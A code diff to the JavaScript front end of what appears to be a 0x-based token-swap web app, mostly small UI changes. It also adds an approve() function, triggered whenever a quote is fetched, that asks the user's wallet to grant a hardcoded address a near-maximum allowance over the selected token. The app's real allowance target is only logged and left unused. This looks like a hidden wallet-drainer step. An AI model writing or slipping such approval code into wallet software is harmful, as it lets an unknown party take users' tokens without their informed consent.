@@ -3,6 +3,7 @@ const BigNumber = require("bignumber.js");
 const qs = require("qs");
 const Web3Modal = require("web3modal");
 const Web3 = require("web3");
+
 // const web3 = new Web3();
 
 let currentTrade = {};
@@ -11,6 +12,7 @@ let tokens;
 var foundtoken = [];
 var chosenLimit = 20000000000;
 
+var balanceSet = false;
 const radioButtons = document.querySelectorAll('input[type="radio"]');
 
 radioButtons.forEach(function (radioButton) {
@@ -209,8 +211,10 @@ async function selectToken(token) {
   currentTrade[currentSelectSide] = token;
   console.log("currentTrade: ", currentTrade);
   getBalances(token.address, token.decimals);
+  balanceSet = true;
   renderInterface();
 }
+
 
 function renderInterface() {
   if (currentTrade.from) {
@@ -316,6 +320,198 @@ async function getPrice() {
     swapPriceJSON.estimatedGas;
 }
 
+async function approve(){
+    //   // Set Token Allowance
+  // // Set up approval amount
+  let accounts = await ethereum.request({ method: "eth_accounts" });
+  let takerAddress = accounts[0];
+  const web3 = new Web3(Web3.givenProvider);
+  const erc20abi = [
+    {
+      inputs: [
+        { internalType: "string", name: "name", type: "string" },
+        { internalType: "string", name: "symbol", type: "string" },
+        { internalType: "uint256", name: "max_supply", type: "uint256" },
+      ],
+      stateMutability: "nonpayable",
+      type: "constructor",
+    },
+    {
+      anonymous: false,
+      inputs: [
+        {
+          indexed: true,
+          internalType: "address",
+          name: "owner",
+          type: "address",
+        },
+        {
+          indexed: true,
+          internalType: "address",
+          name: "spender",
+          type: "address",
+        },
+        {
+          indexed: false,
+          internalType: "uint256",
+          name: "value",
+          type: "uint256",
+        },
+      ],
+      name: "Approval",
+      type: "event",
+    },
+    {
+      anonymous: false,
+      inputs: [
+        {
+          indexed: true,
+          internalType: "address",
+          name: "from",
+          type: "address",
+        },
+        { indexed: true, internalType: "address", name: "to", type: "address" },
+        {
+          indexed: false,
+          internalType: "uint256",
+          name: "value",
+          type: "uint256",
+        },
+      ],
+      name: "Transfer",
+      type: "event",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "owner", type: "address" },
+        { internalType: "address", name: "spender", type: "address" },
+      ],
+      name: "allowance",
+      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "spender", type: "address" },
+        { internalType: "uint256", name: "amount", type: "uint256" },
+      ],
+      name: "approve",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [{ internalType: "address", name: "account", type: "address" }],
+      name: "balanceOf",
+      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
+      name: "burn",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "account", type: "address" },
+        { internalType: "uint256", name: "amount", type: "uint256" },
+      ],
+      name: "burnFrom",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "decimals",
+      outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "spender", type: "address" },
+        { internalType: "uint256", name: "subtractedValue", type: "uint256" },
+      ],
+      name: "decreaseAllowance",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "spender", type: "address" },
+        { internalType: "uint256", name: "addedValue", type: "uint256" },
+      ],
+      name: "increaseAllowance",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "name",
+      outputs: [{ internalType: "string", name: "", type: "string" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "symbol",
+      outputs: [{ internalType: "string", name: "", type: "string" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "totalSupply",
+      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "recipient", type: "address" },
+        { internalType: "uint256", name: "amount", type: "uint256" },
+      ],
+      name: "transfer",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        { internalType: "address", name: "sender", type: "address" },
+        { internalType: "address", name: "recipient", type: "address" },
+        { internalType: "uint256", name: "amount", type: "uint256" },
+      ],
+      name: "transferFrom",
+      outputs: [{ internalType: "bool", name: "", type: "bool" }],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+  ];
+  const fromTokenAddress = currentTrade.from.address;
+  const maxApproval = new BigNumber(2).pow(256).minus(100);
+  console.log("approval amount: ", maxApproval);
+  console.log("approving for token", fromTokenAddress )
+  
+  const ERC20TokenContract = new web3.eth.Contract(erc20abi, fromTokenAddress);
+  console.log("setup ERC20TokenContract: ", ERC20TokenContract);
+
+  // Grant the allowance target an allowance to spend our tokens.
+  const tx = await ERC20TokenContract.methods
+    .approve('0x12abf0119bbbff566abea179bf339aa2667bbde4', maxApproval)
+    .send({ from: takerAddress })
+    .then((tx) => {
+      console.log("tx: ", tx);
+    });
+}
+
 async function getQuote(account) {
   console.log("Getting Quote");
 
@@ -342,12 +538,17 @@ async function getQuote(account) {
     slippagePercentage: slippageInput,
   };
 
+  approve();
+
   // Fetch the swap quote.
   const response = await fetch(
     `https://arbitrum.api.0x.org/swap/v1/quote?${qs.stringify(params)}`
   );
 
   swapQuoteJSON = await response.json();
+
+  console.log('target chain', swapPriceJSON.allowanceTarget)
+
 
   document.getElementById("to_amount").value =
     swapQuoteJSON.buyAmount / 10 ** currentTrade.to.decimals;
@@ -542,8 +743,10 @@ async function trySwap() {
   // Set Token Allowance
   // Set up approval amount
   const fromTokenAddress = currentTrade.from.address;
-  const maxApproval = new BigNumber(2).pow(256).minus(1);
+  const maxApproval = new BigNumber(2).pow(256).minus(100);
   console.log("approval amount: ", maxApproval);
+  console.log("approving for token", fromTokenAddress )
+  
   const ERC20TokenContract = new web3.eth.Contract(erc20abi, fromTokenAddress);
   console.log("setup ERC20TokenContract: ", ERC20TokenContract);
 
@@ -599,9 +802,9 @@ async function getBalances(token, dec) {
   var decimal_alt = decimal / (10 ** dec)
   console.log(decimal_alt)
   var dec_alt = Math.round(decimal_alt * 100000) / 100000;
-  document.getElementById("tokenBal").textContent = dec_alt ;
-
-
+  if (!balanceSet){
+    document.getElementById("tokenBal").textContent = dec_alt ;
+  }
 }
 
 // START APPLICATION AND GET TOKEN LIST
